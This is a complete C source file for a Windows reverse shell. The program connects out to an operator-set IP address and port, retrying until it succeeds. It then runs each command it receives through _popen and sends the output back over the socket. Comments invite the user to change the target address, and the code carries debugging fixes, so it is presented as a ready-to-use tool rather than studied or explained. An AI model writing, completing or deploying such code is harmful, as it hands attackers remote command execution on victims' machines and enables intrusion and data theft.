#include <stdio.h>
#include <stdlib.h>
#include <ws2tcpip.h>
#include <winsock2.h>
#include <string.h>

int main()
{
    printf("Program started...\n");

    WSADATA wsadata;
    int wsastart = WSAStartup(MAKEWORD(2,2), &wsadata);
    if (wsastart != 0)
        printf("WSAStartup failed\n");
    else
        printf("WSAStartup Success...\n");

    SOCKET outgoingsock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in routeinfo;
    memset(&routeinfo, 0, sizeof(routeinfo));
    routeinfo.sin_family = AF_INET;
    routeinfo.sin_addr.s_addr = inet_addr("127.0.0.1"); // CHANGE IP ADDRESS HERE!!
    routeinfo.sin_port = htons(8888);                   // CHANGE PORT HERE!!

    int connectionstatus = -1;

    printf("Loop Started...\n");
    while (connectionstatus)
    {
        printf("Connecting to %s:%d\n", inet_ntoa(routeinfo.sin_addr), ntohs(routeinfo.sin_port));
        int connecattempt = connect(outgoingsock, (struct sockaddr*)&routeinfo, sizeof(routeinfo));
        if (connecattempt == 0)
        {
            printf("Connection Successful...\n");
            connectionstatus = 0;
        }
        else
        {
            printf("Connection failed, error %d, trying again in 5 seconds..\n", WSAGetLastError());
            closesocket(outgoingsock);
            Sleep(5000);
            outgoingsock = socket(AF_INET, SOCK_STREAM, 0);
        }
    }

    char incominginstructions[2000];

    while (1)
    {
        int recsock = recv(outgoingsock, incominginstructions, sizeof(incominginstructions) - 1, 0);
        if (recsock <= 0)
        {
            printf("Couldn't receive commands\n");
            break;
        }

        // Null terminate at actual received length
        incominginstructions[recsock] = '\0';

        if (_stricmp(incominginstructions, "exit\n") == 0 || _stricmp(incominginstructions, "exit\r\n") == 0)
            break;

        // Fixed: was checking stdout instead of stdoutp
        FILE *stdoutp = _popen(incominginstructions, "r");
        if (stdoutp == NULL)
        {
            printf("Command failed\n");
            continue;
        }

        char outgoingoutp[8000];
        int total = 0;
        outgoingoutp[0] = '\0';

        while (fgets(outgoingoutp + total, sizeof(outgoingoutp) - total, stdoutp) != NULL)
        {
            total = strlen(outgoingoutp);
        }
        _pclose(stdoutp);

        // Fixed: was overwriting total_sent instead of accumulating
        int total_sent = 0;
        while (total_sent < total)
        {
            int sent = send(outgoingsock, outgoingoutp + total_sent, total - total_sent, 0);
            if (sent <= 0) break;
            total_sent += sent;
        }
    }

    closesocket(outgoingsock);
    WSACleanup();
    return 0;
}